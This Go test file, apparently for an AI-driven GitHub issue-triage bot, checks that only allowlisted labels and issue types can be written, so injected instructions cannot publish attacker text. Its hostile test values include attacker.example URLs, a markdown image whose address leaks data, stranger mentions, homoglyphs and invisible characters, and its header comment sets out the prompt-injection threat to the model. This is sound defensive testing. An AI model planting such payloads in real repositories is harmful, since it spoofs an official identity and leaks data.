// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"io"
	"net/http"
	"strings"
	"testing"
)

// The bot's entire write surface to GitHub, and why no attacker text can ride
// out on it.
//
// The reputational risk with a bot posting under an official identity on a
// public repository is that someone gets THEIR words published as OURS: a URL,
// a mention that pings a stranger, an image whose address carries data, an
// accusation. That risk is a function of what the bot can write, not of how
// well the model behaves, and this bot writes exactly two things:
//
//   - SetType sends one of {Bug, Feature, Task}
//   - AddLabel sends one of the configured labels, by default
//     {bug, enhancement, documentation, question}
//
// There is no comment, no review, no title or body edit, so there is no field
// that free text could be routed into even if the model asked for one, and
// TestEveryPathToGitHubPassesTheDryRunChokepoint fails if a third write path
// appears. That makes the guarantee structural rather than behavioural: the
// model's compliance with an injected instruction does not enter into it,
// because there is nowhere for a complied-with instruction to go.
//
// The two halves below are what make that a measured claim instead of a
// reading of the code.
//
// Killing mutations, both verified: have canonicalLabel return its `label`
// argument instead of the allowlist entry `a`; drop the `!ok` refusal from
// doAddLabel.

// hostileValues are what an attacker would try to have published under the
// bot's identity, plus the shapes that get past filters comparing literals.
var hostileValues = []struct{ name, value string }{
	{"a url", "https://attacker.example/x"},
	{"a mention that would notify a stranger", "@torvalds please review"},
	{"a markdown image whose address carries data", "![](https://attacker.example/x.png?d=leaked)"},
	{"an accusation", "bug (reported by a known spammer)"},
	// A Latin small letter script g, which renders as "bug" and is not "bug".
	{"a homoglyph of an allowed label", "bu\u0261"},
	{"a right-to-left override", "bug\u202egnitset"},
	{"a zero-width space inside an allowed label", "bu\u200bg"},
	{"an allowed label with text appended", "bug and also @everyone"},
	{"an allowed label with a url appended", "bug https://attacker.example"},
	{"a very long value", strings.Repeat("a", 5000)},
	{"an empty value", ""},
}

// Half one: a value that is not on the allowlist is refused, and nothing is
// sent. Refusing after the request would be no defence at all, so the
// assertion is on the call count rather than on the returned status alone.
func TestHostileValuesReachNeitherGitHubNorTheAllowlist(t *testing.T) {
	for _, hv := range hostileValues {
		t.Run(hv.name, func(t *testing.T) {
			for _, path := range []struct {
				field string
				call  func(*Client) (actionResult, error)
			}{
				{"label", func(c *Client) (actionResult, error) { return c.doAddLabel(scoped(7), 7, hv.value) }},
				{"type", func(c *Client) (actionResult, error) { return c.doChangeType(scoped(7), 7, hv.value) }},
			} {
				t.Run(path.field, func(t *testing.T) {
					c, calls := countingClient(t, testConfig(), http.StatusOK, `{}`)
					c.authorize(7, need{typ: true, label: true})

					res, err := path.call(c)
					if err != nil {
						t.Fatalf("a rejected value must be a model-readable result, not a Go error: %v", err)
					}
					if res.Status != "error" {
						t.Errorf("status = %q, want error: %q is not on the allowlist and must be refused",
							res.Status, hv.value)
					}
					if got := calls.Load(); got != 0 {
						t.Errorf("made %d HTTP call(s) for a refused value; a refusal after the request "+
							"would already have published it", got)
					}
				})
			}
		})
	}
}

// Half two: when a value IS accepted, the bytes on the wire are the
// allowlist's, not the caller's.
//
// This is the half that would survive a model that never emits anything
// obviously hostile. canonicalLabel returns the allowlist entry rather than
// what it was handed, so the request body cannot carry a caller-chosen
// spelling -- not different casing, and not the invisible characters that a
// case-insensitive comparison would otherwise have waved through had it
// returned its own argument.
func TestAnAcceptedValueIsWrittenInTheAllowlistsOwnSpelling(t *testing.T) {
	// Accepted, because TrimSpace removes the non-breaking space and the
	// comparison ignores case -- and still written as plain "bug".
	const asked = "\u00a0BUG\u00a0"

	var body string
	c := writeClient(t, testConfig(), untriagedIssueJSON, func(w http.ResponseWriter, r *http.Request) {
		raw, err := io.ReadAll(r.Body)
		if err != nil {
			t.Errorf("read the request body: %v", err)
		}
		body = string(raw)
		_, _ = io.WriteString(w, `[{"name":"bug"}]`)
	})
	c.authorize(7, need{label: true})

	res, err := c.doAddLabel(scoped(7), 7, asked)
	if err != nil {
		t.Fatalf("doAddLabel() error = %v", err)
	}
	if res.Status != "success" {
		t.Fatalf("status = %q, want success: %q canonicalizes to an allowed label", res.Status, asked)
	}
	if !strings.Contains(body, `"bug"`) {
		t.Errorf("request body %q does not carry the allowlist spelling \"bug\"", body)
	}
	if strings.Contains(body, "BUG") || strings.Contains(body, "\u00a0") {
		t.Errorf("request body %q carries the caller's spelling. GitHub must receive the allowlist "+
			"entry, so that no part of a written value originates with the model.", body)
	}
}
